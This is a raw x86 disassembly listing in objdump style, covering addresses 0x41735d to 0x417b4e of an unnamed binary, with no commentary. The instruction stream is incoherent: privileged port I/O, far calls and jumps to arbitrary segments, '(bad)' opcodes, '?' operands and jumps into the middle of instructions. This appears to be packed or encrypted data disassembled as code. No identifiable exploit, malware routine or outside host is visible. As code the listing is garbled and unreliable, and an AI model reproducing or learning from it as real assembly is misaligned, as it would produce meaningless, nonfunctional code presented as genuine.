  41735d:	mov    ah,0xa
  41735f:	stc    
  417360:	mov    dl,0xb2
  417362:	sti    
  417363:	push   ds
  417364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417365:	out    0xe9,eax
  417367:	push   0xffffffe8
  417369:	das    
  41736a:	arpl   WORD PTR [edi],cx
  41736c:	push   eax
  41736d:	dec    esi
  41736e:	inc    esi
  41736f:	loope  0x4173a3
  417371:	dec    eax
  417372:	push   cs
  417373:	inc    edx
  417374:	and    BYTE PTR [ebp-0x5c0162e5],0x85
  41737b:	mov    esp,0x9eb8c72e
  417380:	iret   
  417381:	jge    0x4173b4
  417383:	push   ebp
  417384:	lds    esp,FWORD PTR [edx+0x16f57ebf]
  41738a:	mov    edi,0xf0ab9f4e
  41738f:	jne    0x4173c1
  417391:	aaa    
  417392:	repnz pop ebp
  417394:	xchg   ebx,eax
  417395:	lods   al,BYTE PTR ds:[esi]
  417396:	in     eax,dx
  417397:	and    dl,al
  417399:	fmulp  st(2),st
  41739b:	sbb    BYTE PTR [edx-0x3f],dh
  41739e:	sub    eax,0x7ac1b57d
  4173a3:	nop
  4173a4:	ret    
  4173a5:	daa    
  4173a6:	cwde   
  4173a7:	xchg   edx,eax
  4173a8:	and    al,0x8c
  4173aa:	div    DWORD PTR [ebx]
  4173ac:	sub    DWORD PTR [eax*2-0x52d5440f],edi
  4173b3:	fmul   DWORD PTR [esi+0x52]
  4173b6:	(bad)  
  4173b7:	mov    esp,0x6f10761b
  4173bc:	mov    BYTE PTR ds:0x907e5872,ch
  4173c2:	pushf  
  4173c3:	int3   
  4173c4:	or     BYTE PTR [esi+0x2a],dh
  4173c7:	ret    0x1e42
  4173ca:	or     al,0xb5
  4173cc:	or     BYTE PTR [edx-0x49],ch
  4173cf:	push   ebp
  4173d0:	add    al,0xeb
  4173d2:	adc    ah,BYTE PTR [edi]
  4173d4:	inc    edx
  4173d5:	sub    al,BYTE PTR [edi-0xbbe5987]
  4173db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173dc:	out    dx,eax
  4173dd:	aas    
  4173de:	sub    al,0x2e
  4173e0:	jl     0x417412
  4173e2:	inc    edi
  4173e3:	retf   0xc734
  4173e6:	mov    esi,0xbfea1d3b
  4173eb:	add    al,0xf9
  4173ed:	cmp    BYTE PTR [ebp-0x36194842],bl
  4173f3:	pop    esi
  4173f4:	daa    
  4173f5:	xchg   edi,eax
  4173f6:	cli    
  4173f7:	in     al,0xac
  4173f9:	mov    DWORD PTR [edi-0x19a7808b],esi
  4173ff:	sub    BYTE PTR [ebp+0x70],0x1f
  417403:	mov    ebp,0xbe9655c9
  417408:	fiadd  DWORD PTR [si+0x12]
  41740c:	push   0xffffff98
  41740e:	push   edx
  41740f:	js     0x41742c
  417411:	pop    esi
  417412:	sub    BYTE PTR [ecx],bl
  417414:	fadd   QWORD PTR [esi]
  417416:	ss ds sbb eax,0x6fd2761
  41741d:	jns    0x41746f
  41741f:	xchg   edi,eax
  417420:	push   edx
  417421:	sub    eax,0x5c5351a0
  417426:	cmp    eax,0x1c08fa70
  41742b:	repz imul ebx,DWORD PTR [edi+edi*8-0x6507969a],0x6635b1bc
  417437:	xor    dh,BYTE PTR [eax-0x58521853]
  41743d:	pusha  
  41743e:	imul   BYTE PTR [ecx+0x9]
  417441:	scas   eax,DWORD PTR es:[edi]
  417442:	dec    edi
  417443:	mov    bh,0xf8
  417445:	repz push eax
  417447:	fld    QWORD PTR [edi+eiz*8-0x55003f43]
  41744e:	int    0xa3
  417450:	sbb    dh,BYTE PTR ds:0xe2899f5c
  417456:	sbb    dh,BYTE PTR [ecx+0x2e]
  417459:	add    al,0xcf
  41745b:	and    BYTE PTR [ebx+0x3d],dl
  41745e:	jle    0x417430
  417460:	mov    esi,0xa24f6dce
  417465:	sahf   
  417466:	pop    ecx
  417467:	test   BYTE PTR [esi],bh
  417469:	sub    DWORD PTR [edx],ebp
  41746b:	mov    ch,0xe9
  41746d:	inc    edi
  41746e:	and    eax,DWORD PTR [edi]
  417470:	int    0xec
  417472:	div    DWORD PTR [edx]
  417474:	add    al,BYTE PTR [ecx]
  417476:	jno    0x41744d
  417478:	xchg   ebp,eax
  417479:	fild   WORD PTR [edx+0x734f6424]
  41747f:	aad    0xdf
  417481:	xchg   DWORD PTR [esi+ebx*2],ebx
  417484:	push   ds
  417485:	cmp    esi,edi
  417487:	ss dec edi
  417489:	out    dx,al
  41748a:	add    eax,0x9f36f05e
  41748f:	inc    edx
  417490:	push   edx
  417491:	jg     0x4174e5
  417493:	gs jmp 0x6a8a11a7
  417499:	mov    bl,0x1f
  41749b:	dec    ebp
  41749c:	cmp    BYTE PTR [esi-0x63],al
  41749f:	push   edi
  4174a0:	sub    ah,ah
  4174a2:	ins    BYTE PTR es:[edi],dx
  4174a3:	mov    DWORD PTR [edx-0x14aaa1b4],eax
  4174a9:	das    
  4174aa:	push   cs
  4174ab:	addr16 dec eax
  4174ad:	loopne 0x417517
  4174af:	call   DWORD PTR ds:0xa13bc5d8
  4174b5:	shr    BYTE PTR [edi],cl
  4174b7:	test   al,0x89
  4174b9:	jg     0x4174aa
  4174bb:	jne    0x41746e
  4174bd:	inc    eax
  4174be:	jns    0x4174d8
  4174c0:	rol    al,0x12
  4174c3:	fwait
  4174c4:	out    0xe4,eax
  4174c6:	xor    ebp,DWORD PTR [eax]
  4174c8:	mov    ebp,0x870ef019
  4174cd:	call   0x9a47:0x13f084ef
  4174d4:	sub    BYTE PTR [eax-0x36445f15],0x65
  4174db:	push   ecx
  4174dc:	cli    
  4174dd:	push   eax
  4174de:	ficomp DWORD PTR [edi-0x47]
  4174e1:	pop    es
  4174e2:	aam    0x3e
  4174e4:	aas    
  4174e5:	add    al,BYTE PTR [eax+0x257ca002]
  4174eb:	jnp    0x417510
  4174ed:	and    DWORD PTR [esi+0x6e],0x59d36b93
  4174f4:	sbb    DWORD PTR [edi-0x66],0xfffffff7
  4174f8:	int    0xed
  4174fa:	ss xor ch,dl
  4174fd:	inc    edi
  4174fe:	adc    DWORD PTR [edi],ecx
  417500:	les    edx,FWORD PTR ds:0x18cdb319
  417506:	xchg   edx,eax
  417507:	jbe    0x4174a6
  417509:	mov    cl,0x37
  41750b:	jmp    0xfc2e0d6b
  417510:	aam    0x29
  417512:	imul   ebp,DWORD PTR [ebx],0xfffffff5
  417515:	jmp    ecx
  417517:	call   0x3fc3:0x1add90e4
  41751e:	repz je 0x417581
  417521:	sub    eax,0x8d2deed4
  417526:	lods   eax,DWORD PTR ds:[esi]
  417527:	xor    eax,0x9d440c02
  41752c:	icebp  
  41752d:	cmp    DWORD PTR [ecx-0xa41ad78],esi
  417533:	add    edx,DWORD PTR [ebp-0x69]
  417536:	sub    eax,DWORD PTR [ecx+0x3a54d87d]
  41753c:	jg     0x417551
  41753e:	leave  
  41753f:	popa   
  417540:	test   BYTE PTR [edi-0x30],cl
  417543:	sub    bh,BYTE PTR [ebp-0x1e]
  417546:	popf   
  417547:	rcr    BYTE PTR [eax],1
  417549:	in     eax,0xd8
  41754b:	ds mov ebp,0xb7e793bd
  417551:	xchg   esp,eax
  417552:	fwait
  417553:	push   cs
  417554:	(bad)  
  417555:	nop
  417556:	mov    al,0x1e
  417558:	sub    eax,0x5d5b2527
  41755d:	push   eax
  41755e:	mov    ds:0xa7c6d6cc,eax
  417563:	push   ebp
  417564:	test   al,0xde
  417566:	mov    cs,WORD PTR [edx]
  417568:	and    DWORD PTR [edi+0x5b],0x4
  41756c:	push   ecx
  41756d:	jp     0x41751b
  41756f:	pushf  
  417570:	les    ebp,FWORD PTR [ebx+ebp*1+0x18]
  417574:	xchg   ecx,eax
  417575:	bound  edi,QWORD PTR [ecx+0x69]
  417578:	inc    edx
  417579:	retf   
  41757a:	cld    
  41757b:	mov    esp,0xd43a79c8
  417580:	fbld   TBYTE PTR [ecx-0x53]
  417583:	aam    0x93
  417585:	push   esi
  417586:	or     eax,0x5e50d1e3
  41758b:	add    ecx,esp
  41758d:	ror    cl,1
  41758f:	aas    
  417590:	out    dx,eax
  417591:	imul   ebp,DWORD PTR [eax+eax*8+0x46],0x42ef123f
  417599:	sub    ch,0xcf
  41759c:	dec    eax
  41759d:	mov    esi,0x69db43a5
  4175a2:	imul   BYTE PTR ds:[ecx+0x26]
  4175a6:	ror    bh,0x49
  4175a9:	into   
  4175aa:	add    BYTE PTR [esi],al
  4175ac:	cli    
  4175ad:	jns    0x41753d
  4175af:	add    al,0x4b
  4175b1:	sahf   
  4175b2:	inc    ebp
  4175b3:	mov    ah,0xa3
  4175b5:	or     BYTE PTR [edi-0x3f],0xde
  4175b9:	fs cmc 
  4175bb:	push   edx
  4175bc:	lahf   
  4175bd:	adc    eax,0x9e0a74bb
  4175c2:	in     al,0xd2
  4175c4:	sbb    eax,0x7a5d00e5
  4175c9:	in     al,dx
  4175ca:	dec    esp
  4175cb:	das    
  4175cc:	and    DWORD PTR [esi+0xd],ebp
  4175cf:	outs   dx,DWORD PTR ds:[esi]
  4175d0:	ins    BYTE PTR es:[edi],dx
  4175d1:	fisttp DWORD PTR [ebp+0x3a5ffc0a]
  4175d7:	pop    ebx
  4175d8:	popf   
  4175d9:	dec    eax
  4175da:	mov    dh,0x5b
  4175dc:	xchg   edx,eax
  4175dd:	aad    0x38
  4175df:	mov    eax,ds:0x32fe5d5e
  4175e4:	packssdw mm6,QWORD PTR [ebp-0x32]
  4175e8:	jns    0x417633
  4175ea:	popf   
  4175eb:	(bad)  
  4175ec:	ret    0xa4d
  4175ef:	sar    BYTE PTR [edx+0x67f10077],0x8f
  4175f6:	test   DWORD PTR [esi+0x16],ecx
  4175f9:	jle    0x417583
  4175fb:	cmp    ebx,DWORD PTR [edi+0xd645bcf]
  417601:	pop    ecx
  417602:	xor    dl,BYTE PTR [esi]
  417604:	rcl    DWORD PTR [ebx-0x6ae74ac1],cl
  41760a:	or     DWORD PTR [ecx+0x335f8379],eax
  417610:	cmp    BYTE PTR [esi],bh
  417612:	mov    ebp,0x2071e0ce
  417617:	mov    dl,0x2e
  417619:	jle    0x41760b
  41761b:	clc    
  41761c:	pop    esi
  41761d:	and    bh,al
  41761f:	mov    ah,0x13
  417621:	dec    esp
  417622:	into   
  417623:	jb     0x4175f3
  417625:	cli    
  417626:	fsubr  QWORD PTR [eax-0x2714b4c7]
  41762c:	ret    0x1bc7
  41762f:	scas   ax,WORD PTR es:[edi]
  417631:	jae    0x4175d9
  417633:	mov    al,0xee
  417635:	std    
  417636:	pop    ds
  417637:	lods   al,BYTE PTR ds:[esi]
  417638:	into   
  417639:	add    BYTE PTR [ecx],ch
  41763b:	out    0xb5,al
  41763d:	add    DWORD PTR [esi+0xa],0xffffffa1
  417641:	adc    dl,cl
  417643:	push   ebx
  417644:	rcr    BYTE PTR [ebp+0xa],0xaf
  417648:	mov    dl,0x10
  41764a:	ret    0x85b1
  41764d:	test   eax,0x489e4ed5
  417652:	jne    0x417621
  417654:	nop
  417655:	scas   eax,DWORD PTR es:[edi]
  417656:	stos   DWORD PTR es:[edi],eax
  417657:	or     eax,0xef8043c0
  41765c:	mov    esi,DWORD PTR [esi]
  41765e:	add    dh,BYTE PTR [eax]
  417660:	ins    BYTE PTR es:[edi],dx
  417661:	or     al,0xf4
  417663:	push   fs
  417665:	or     eax,0xcb5c0a43
  41766a:	mov    DWORD PTR ds:0xb258c03f,esp
  417670:	pop    ebx
  417671:	test   al,0x60
  417673:	int    0xe1
  417675:	mov    ecx,0x35334d63
  41767a:	loope  0x4176e8
  41767c:	xor    dl,BYTE PTR [ebp+0x6]
  41767f:	xchg   ebx,eax
  417680:	js     0x417650
  417682:	mov    cl,0x37
  417684:	adc    ecx,DWORD PTR [ebp+0x1ae7ff8e]
  41768a:	mov    esp,ebp
  41768c:	dec    ebp
  41768d:	gs call 0x51f0:0x51619830
  417695:	pop    ebx
  417696:	mov    esi,0x589aac7
  41769b:	test   DWORD PTR ds:[edi+0x3dabf18e],esi
  4176a2:	or     dh,BYTE PTR [ebx]
  4176a4:	scas   eax,DWORD PTR es:[edi]
  4176a5:	or     ebp,esp
  4176a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a8:	outs   dx,DWORD PTR ds:[esi]
  4176a9:	mov    edi,0xf18479e6
  4176ae:	mov    eax,ds:0xdbfc360b
  4176b3:	xchg   esp,eax
  4176b4:	inc    ebp
  4176b5:	xor    eax,0x559aa132
  4176ba:	test   BYTE PTR [ebx+esi*8-0x359391ec],ah
  4176c1:	loop   0x4176ba
  4176c3:	jecxz  0x4176a8
  4176c5:	inc    edi
  4176c6:	push   0x54
  4176c8:	(bad)  
  4176c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ca:	pop    edx
  4176cb:	add    eax,0xdfcd1616
  4176d0:	test   al,0xa7
  4176d2:	xor    BYTE PTR [eax+0x3825acce],bl
  4176d8:	xchg   DWORD PTR [eax-0x6ce1af7c],esp
  4176de:	add    ah,dl
  4176e0:	mov    edi,0xfb912feb
  4176e5:	xchg   esp,eax
  4176e6:	add    al,0x78
  4176e8:	mov    eax,0xf68e93ea
  4176ed:	mov    ah,dl
  4176ef:	pop    esp
  4176f0:	sbb    DWORD PTR ds:0xe7dc6b52,ecx
  4176f6:	les    edx,FWORD PTR [ebx]
  4176f8:	push   ecx
  4176f9:	mov    DWORD PTR [edi+0x5b],esi
  4176fc:	imul   eax,DWORD PTR [edi+esi*8+0x43],0xffffffb8
  417701:	pop    eax
  417702:	xchg   edx,eax
  417703:	and    ah,ah
  417705:	sub    al,0x27
  417707:	inc    eax
  417708:	out    dx,eax
  417709:	mov    ds:0x325b4f13,eax
  41770e:	and    al,0x6d
  417710:	int    0xcc
  417712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417713:	out    dx,al
  417714:	push   esp
  417715:	push   esp
  417716:	test   al,0x31
  417718:	adc    eax,ebx
  41771a:	out    dx,eax
  41771b:	and    dl,BYTE PTR [ebx-0x58bf57e2]
  417721:	aas    
  417722:	imul   esp,ebp,0xffffffca
  417725:	cmp    BYTE PTR [ecx-0x67],0xe4
  417729:	sbb    DWORD PTR [edx+0x6f],ebp
  41772c:	sub    edx,ebp
  41772e:	mov    ah,0x6b
  417730:	mov    ebp,0xc995b04e
  417735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417736:	es sub al,0x79
  417739:	dec    ebx
  41773a:	sub    eax,0x562ba177
  41773f:	inc    esi
  417740:	test   al,0x84
  417742:	sbb    edx,DWORD PTR [esi-0x2c]
  417745:	faddp  st(3),st
  417747:	repz repnz hlt 
  41774a:	dec    edi
  41774b:	dec    ebx
  41774c:	jmp    0x612a28fb
  417751:	push   esp
  417752:	mov    ds:0xad9720e7,al
  417757:	xor    BYTE PTR [edx-0x4314975b],ah
  41775d:	mov    esi,0xc13028da
  417762:	and    al,0x9d
  417764:	xchg   ebx,eax
  417765:	dec    esp
  417766:	xchg   ecx,eax
  417767:	gs call 0x6b73:0x8cbbd1fb
  41776f:	(bad)  
  417770:	dec    ecx
  417771:	ret    
  417772:	ret    0x5aff
  417775:	lods   al,BYTE PTR ds:[esi]
  417776:	lock bound ecx,QWORD PTR [esp+ecx*2+0x15]
  41777b:	call   0x3a14:0xc757b148
  417782:	mov    bh,0x99
  417784:	dec    eax
  417785:	and    eax,0x92e977b8
  41778a:	call   0xb6f238b4
  41778f:	inc    esp
  417790:	dec    esp
  417791:	mov    ?,WORD PTR [edx+0x22850cab]
  417797:	outs   dx,DWORD PTR ds:[esi]
  417798:	mov    DWORD PTR [esi],esi
  41779a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41779b:	push   ecx
  41779c:	xchg   esp,eax
  41779d:	mov    edi,0x1a340e89
  4177a2:	ss (bad) 
  4177a4:	je     0x417737
  4177a6:	add    eax,0x26f0491a
  4177ab:	xchg   DWORD PTR [ebx+0x4a],ecx
  4177ae:	shl    BYTE PTR ds:0xb5d1f398,1
  4177b4:	call   0xbaa5:0x7c85706a
  4177bb:	sbb    ebx,DWORD PTR [esi-0x16]
  4177be:	inc    eax
  4177bf:	dec    edx
  4177c0:	sbb    eax,0x31bbc2e
  4177c5:	sbb    BYTE PTR [edi-0x17],0xd7
  4177c9:	xchg   esp,eax
  4177ca:	pop    esp
  4177cb:	push   esp
  4177cc:	jns    0x417826
  4177ce:	inc    edx
  4177cf:	dec    edi
  4177d0:	xchg   esi,eax
  4177d1:	cmp    al,0xc1
  4177d3:	dec    esp
  4177d4:	push   edx
  4177d5:	xor    BYTE PTR [esi+ecx*1],ch
  4177d8:	stos   DWORD PTR es:[edi],eax
  4177d9:	dec    ebp
  4177da:	adc    al,0x6
  4177dc:	adc    dl,cl
  4177de:	sbb    ebx,ebp
  4177e0:	mov    dh,bh
  4177e2:	mov    es,ebx
  4177e4:	sub    cl,0x4e
  4177e7:	repnz shr DWORD PTR [edx+esi*8],0xfc
  4177ec:	xchg   edi,eax
  4177ed:	in     eax,dx
  4177ee:	shl    BYTE PTR [esi-0x77882cc4],cl
  4177f4:	cmp    eax,0x280bc2d0
  4177f9:	out    0x81,eax
  4177fb:	dec    ebp
  4177fc:	imul   eax,DWORD PTR ds:0x6d9f0652,0xffffffb7
  417803:	push   esp
  417804:	in     al,0x63
  417806:	inc    edx
  417807:	les    ebx,FWORD PTR ds:0xb1995220
  41780d:	popa   
  41780e:	mov    dl,BYTE PTR [edx+esi*4+0x2a0cd543]
  417815:	and    ebp,esp
  417817:	lods   al,BYTE PTR ds:[esi]
  417818:	push   ds
  417819:	fiadd  DWORD PTR ds:0x8d3ea3a4
  41781f:	ds or  dl,dl
  417822:	(bad)  
  417823:	out    dx,al
  417824:	cmp    BYTE PTR [ecx-0x768f7cf2],bh
  41782a:	pop    ss
  41782b:	cmp    eax,0x376d2dfc
  417830:	jns    0x417805
  417832:	cmp    al,0x46
  417834:	mov    bl,0xd7
  417836:	jl     0x4177ec
  417838:	adc    ebx,eax
  41783a:	dec    esp
  41783b:	jae    0x417870
  41783d:	test   cl,cl
  41783f:	push   eax
  417840:	mov    edi,DWORD PTR [ebx+eax*2-0x75]
  417844:	and    BYTE PTR [ebp+0x5679ae6e],dh
  41784a:	lods   eax,DWORD PTR ds:[esi]
  41784b:	mov    dh,0x15
  41784d:	adc    eax,0x955d54db
  417852:	shl    BYTE PTR [edi+0x2e],1
  417855:	sbb    BYTE PTR [ebx+esi*2+0x6a],dh
  417859:	jmp    0xb5b2:0x9933d5f0
  417860:	mov    bl,0xc6
  417862:	jmp    0x417856
  417864:	mov    ecx,0x2393c5c3
  417869:	je     0x4178bf
  41786b:	and    DWORD PTR [ecx-0x7],edi
  41786e:	fdiv   DWORD PTR [eax+0x17]
  417871:	xchg   edx,eax
  417872:	and    dh,BYTE PTR [edi+0x1]
  417875:	(bad)  [eax+0x51]
  417878:	shr    ah,cl
  41787a:	or     DWORD PTR [edi],edi
  41787c:	push   ss
  41787d:	or     eax,0xa56ae9cd
  417882:	inc    ebx
  417883:	and    BYTE PTR [ecx+0x78dff6fb],al
  417889:	shr    ebp,0x91
  41788c:	add    ch,ah
  41788e:	in     eax,0x26
  417890:	pop    ds
  417891:	inc    ebx
  417892:	mov    al,ds:0xa343f172
  417897:	fnstsw WORD PTR [esi+edi*1]
  41789a:	push   es
  41789b:	ret    0xcf4f
  41789e:	pop    ds
  41789f:	pop    eax
  4178a0:	cmp    esp,edi
  4178a2:	cmp    al,0xe2
  4178a4:	inc    ebp
  4178a5:	inc    edi
  4178a6:	xchg   edx,eax
  4178a7:	shr    BYTE PTR [ebp-0x5],0xf5
  4178ab:	dec    ebp
  4178ac:	push   esp
  4178ad:	mov    ebx,DWORD PTR [ecx]
  4178af:	sar    DWORD PTR [ecx],0x8b
  4178b2:	dec    ebx
  4178b3:	std    
  4178b4:	pop    edx
  4178b5:	jl     0x417919
  4178b7:	int    0x56
  4178b9:	fist   DWORD PTR [edx+0x5b33f9d2]
  4178bf:	into   
  4178c0:	mov    ch,0x57
  4178c2:	lahf   
  4178c3:	call   FWORD PTR [edi]
  4178c5:	seto   BYTE PTR ds:0x8b580688
  4178cc:	sbb    DWORD PTR [edi-0x1652e5fc],ebp
  4178d2:	test   eax,0x369d9b4a
  4178d7:	add    BYTE PTR [edi+0x1d79da88],dh
  4178dd:	stos   DWORD PTR es:[edi],eax
  4178de:	ret    0xe5d3
  4178e1:	pop    esi
  4178e2:	mov    WORD PTR [edx],fs
  4178e4:	in     al,0x1a
  4178e6:	arpl   ax,si
  4178e8:	fild   WORD PTR [ebx+eiz*2]
  4178eb:	das    
  4178ec:	dec    ebx
  4178ed:	jb     0x4178fc
  4178ef:	aaa    
  4178f0:	jne    0x41794e
  4178f2:	repz ss push edi
  4178f5:	push   DWORD PTR [ebp+eiz*2+0x2d]
  4178f9:	push   ds
  4178fa:	fisubr DWORD PTR [ebx]
  4178fc:	dec    ecx
  4178fd:	sub    eax,0x229825f8
  417902:	inc    edx
  417903:	jne    0x4178d7
  417905:	mov    ss,esp
  417907:	adc    esp,DWORD PTR [edi-0x3b]
  41790a:	or     eax,esp
  41790c:	mov    fs,esi
  41790e:	shl    BYTE PTR [esi-0x1e],0xed
  417912:	mov    ds:0x768f7ae7,al
  417917:	aam    0x9c
  417919:	mov    ch,0x9c
  41791b:	jp     0x417959
  41791d:	jae    0x417903
  41791f:	sti    
  417920:	fimul  WORD PTR [ecx]
  417922:	test   BYTE PTR [edx+ebx*2-0x32781713],ah
  417929:	jecxz  0x417959
  41792b:	aas    
  41792c:	pop    edx
  41792d:	fptan  
  41792f:	into   
  417930:	mov    eax,ds:0x590d0bc8
  417935:	adc    cl,dl
  417937:	cmc    
  417938:	jae    0x417979
  41793a:	out    0x92,al
  41793c:	icebp  
  41793d:	test   BYTE PTR [ebx+0x1bb571ce],dl
  417943:	xor    DWORD PTR [edi],eax
  417945:	cmp    eax,0x86e5d5d1
  41794a:	add    BYTE PTR [esi],dl
  41794c:	xor    bh,BYTE PTR [ecx+0x2eb57cef]
  417952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417953:	rol    esp,cl
  417955:	jbe    0x417930
  417957:	inc    esi
  417958:	lods   eax,DWORD PTR ds:[esi]
  417959:	jge    0x4178e2
  41795b:	and    DWORD PTR [esi],0x3bb7907
  417961:	xchg   ebx,eax
  417962:	jmp    DWORD PTR [esi-0x68]
  417965:	cwde   
  417966:	sbb    al,0x1b
  417968:	lods   eax,DWORD PTR ds:[esi]
  417969:	add    ecx,DWORD PTR [ebx]
  41796b:	fmul   DWORD PTR [edi]
  41796d:	test   BYTE PTR [ebp+edx*8+0x1d],ah
  417971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417972:	jecxz  0x417930
  417974:	jb     0x417906
  417976:	sbb    BYTE PTR [edx+0x55e35d37],bl
  41797c:	inc    ebx
  41797d:	sti    
  41797e:	loop   0x417960
  417980:	cwde   
  417981:	pop    ecx
  417982:	jae    0x4179d0
  417984:	cmp    eax,0x633da0
  417989:	ds add al,0x68
  41798c:	gs std 
  41798e:	cmp    BYTE PTR es:[edx+ecx*8+0x15],0x7a
  417994:	add    eax,0x44533c60
  417999:	ret    0x66ad
  41799c:	jmp    0x72f4:0x7058ddde
  4179a3:	clc    
  4179a4:	rcl    DWORD PTR [esi-0x5046a840],cl
  4179aa:	dec    esp
  4179ab:	inc    ecx
  4179ac:	in     al,dx
  4179ad:	fwait
  4179ae:	test   BYTE PTR [ebx-0x4e531a2d],cl
  4179b4:	cmp    DWORD PTR [edi+0x470c5857],ebx
  4179ba:	jb     0x417a14
  4179bc:	aad    0x1
  4179be:	inc    ebx
  4179bf:	mov    esi,0xdd46dfba
  4179c4:	fldl2t 
  4179c6:	mov    cl,0x5c
  4179c8:	xor    al,0x67
  4179ca:	dec    esp
  4179cb:	or     eax,0xa306ae9c
  4179d0:	test   BYTE PTR [eax],bh
  4179d2:	int3   
  4179d3:	cs ds mov eax,0xeb531444
  4179da:	cld    
  4179db:	scas   al,BYTE PTR es:[edi]
  4179dc:	sub    DWORD PTR [eax-0x7c],ebx
  4179df:	push   0xed2350a2
  4179e4:	mov    al,0xe2
  4179e6:	(bad)
  4179e9:	outs   dx,BYTE PTR ds:[esi]
  4179ea:	jl     0x4179c6
  4179ec:	shr    BYTE PTR [eax+0x838ec26],0x3f
  4179f3:	sbb    cl,dh
  4179f5:	pop    esp
  4179f6:	mov    ebx,0xc7b5ade0
  4179fb:	push   ds
  4179fc:	(bad)  
  4179fd:	sub    BYTE PTR [ebp+0x55705b6f],dl
  417a03:	mov    ah,0xf6
  417a05:	inc    ebx
  417a06:	jae    0x417a63
  417a08:	test   BYTE PTR ss:[ebx-0x5],0xd9
  417a0d:	adc    DWORD PTR [eax],esp
  417a0f:	xor    DWORD PTR [ebx+ebp*8],0xca796999
  417a16:	adc    BYTE PTR [eax+0x70],0xc6
  417a1a:	jle    0x4179c7
  417a1c:	push   ss
  417a1d:	cdq    
  417a1e:	pop    es
  417a1f:	mov    dh,0xf3
  417a21:	cdq    
  417a22:	or     eax,0xbb8f1208
  417a27:	mov    dl,0x2
  417a29:	pop    ss
  417a2a:	xchg   ebp,eax
  417a2b:	adc    eax,0x2a2f44cd
  417a30:	(bad)  
  417a31:	push   ebp
  417a32:	mov    edi,0x37a32f46
  417a37:	mov    BYTE PTR [edi+0x6e61d1e],al
  417a3d:	adc    al,0x46
  417a3f:	mov    bl,0xff
  417a41:	inc    edx
  417a42:	push   es
  417a43:	ja     0x4179f8
  417a45:	add    eax,0x12251d85
  417a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a4b:	adc    eax,0x7c62f312
  417a50:	and    edx,DWORD PTR [edi-0x8d0f20]
  417a56:	lahf   
  417a57:	out    dx,al
  417a58:	and    bl,0x3a
  417a5b:	std    
  417a5c:	jle    0x417a65
  417a5e:	iret   
  417a5f:	dec    edx
  417a60:	mov    cl,0x2e
  417a62:	leave  
  417a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a64:	stos   DWORD PTR es:[edi],eax
  417a65:	ja     0x417aa5
  417a67:	sub    DWORD PTR [esi],edx
  417a69:	or     eax,0xa0d7589e
  417a6e:	mov    eax,ds:0x365111c1
  417a73:	xor    al,0xea
  417a75:	inc    esp
  417a76:	daa    
  417a77:	push   edx
  417a78:	and    bh,BYTE PTR [esi]
  417a7a:	ret    
  417a7b:	sub    ah,BYTE PTR [ebx+eiz*8+0x5f4f34c9]
  417a82:	ds push esp
  417a84:	and    eax,DWORD PTR [ecx]
  417a86:	pop    ecx
  417a87:	lods   eax,DWORD PTR ds:[esi]
  417a88:	jle    0x417aab
  417a8a:	add    bh,al
  417a8c:	fstp   DWORD PTR [ebx+eax*1]
  417a8f:	dec    eax
  417a90:	arpl   WORD PTR [ebp+0x49],bx
  417a93:	xchg   edi,eax
  417a94:	add    DWORD PTR [ebx-0x2370dcc8],ecx
  417a9a:	aam    0xf8
  417a9c:	and    edi,ebp
  417a9e:	fwait
  417a9f:	in     eax,dx
  417aa0:	lods   al,BYTE PTR ds:[esi]
  417aa1:	xchg   edi,eax
  417aa2:	imul   ebx,ecx,0xffffffa1
  417aa5:	inc    esp
  417aa6:	fisttp WORD PTR [edi-0xbc81d55]
  417aac:	fs sbb ebx,ebx
  417aaf:	push   0xffffffd6
  417ab1:	adc    BYTE PTR [ebx],0xbb
  417ab4:	dec    ebp
  417ab5:	push   ebp
  417ab6:	xchg   esp,eax
  417ab7:	sbb    cl,BYTE PTR ds:0x23c730ba
  417abd:	sbb    eax,0xcc80fbb3
  417ac2:	dec    edx
  417ac3:	mov    ch,0xc9
  417ac5:	pop    ebx
  417ac6:	xchg   ebp,eax
  417ac7:	sub    BYTE PTR [ebx-0x42],al
  417aca:	and    DWORD PTR [edi],edi
  417acc:	sub    DWORD PTR [edx+0x22ff5286],ebx
  417ad2:	bound  ecx,QWORD PTR [ebp-0x16]
  417ad5:	xor    BYTE PTR [ebp+0x54],bh
  417ad8:	sahf   
  417ad9:	add    eax,ebp
  417adb:	sub    esi,DWORD PTR [edi]
  417add:	mov    ecx,0x1e420897
  417ae2:	dec    esi
  417ae3:	sahf   
  417ae4:	pusha  
  417ae5:	jns    0x417aee
  417ae7:	mov    al,ds:0xa38d00ff
  417aec:	imul   eax,ebx,0x2172591e
  417af2:	cs retf 
  417af4:	mov    ah,0x67
  417af6:	sub    esi,DWORD PTR [edi-0x14]
  417af9:	into   
  417afa:	int    0xbe
  417afc:	fstp   QWORD PTR [ebx]
  417afe:	sub    al,0xb1
  417b00:	mov    cs:0x100b2fc0,al
  417b06:	mov    ah,dh
  417b08:	js     0x417adc
  417b0a:	sbb    ebp,DWORD PTR cs:[edi+0x14]
  417b0e:	dec    esp
  417b0f:	iret   
  417b10:	add    eax,0xf5e74075
  417b15:	and    eax,0xfc0fbc6
  417b1a:	inc    edx
  417b1b:	mov    cl,0xcc
  417b1d:	fcom   DWORD PTR [ebx]
  417b1f:	mov    DWORD PTR [ebx-0x10],0x3e23cb43
  417b26:	or     al,0xaa
  417b28:	sub    BYTE PTR [esi+ebx*4-0x3c],ah
  417b2c:	test   BYTE PTR [esi+edi*8],0x38
  417b30:	leave  
  417b31:	jg     0x417abe
  417b33:	retf   
  417b34:	popa   
  417b35:	(bad)  
  417b36:	mov    bl,0x57
  417b38:	or     dh,BYTE PTR [esi-0x24c10717]
  417b3e:	mov    ah,0xeb
  417b40:	aad    0xc
  417b42:	scas   al,BYTE PTR es:[edi]
  417b43:	jecxz  0x417b18
  417b45:	cli    
  417b46:	nop
  417b47:	mov    al,ds:0xcd9fb617
  417b4c:	mov    esi,?
  417b4e:	xchg   edi,eax
